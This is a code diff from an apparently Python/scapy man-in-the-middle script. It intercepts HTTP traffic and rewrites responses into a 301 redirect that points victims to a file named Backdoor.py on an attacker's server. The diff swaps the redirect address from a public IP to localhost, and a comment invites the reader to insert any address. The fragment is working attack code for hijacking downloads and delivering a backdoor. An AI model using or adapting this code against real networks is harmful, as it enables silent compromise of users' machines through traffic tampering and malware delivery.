@@ -19,7 +19,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://93.31.82.227:8888/Python/Backdoor.py\n\n" #Put the address you want
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1:8888/Python/Backdoor.py\n\n" #Put the address you want
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
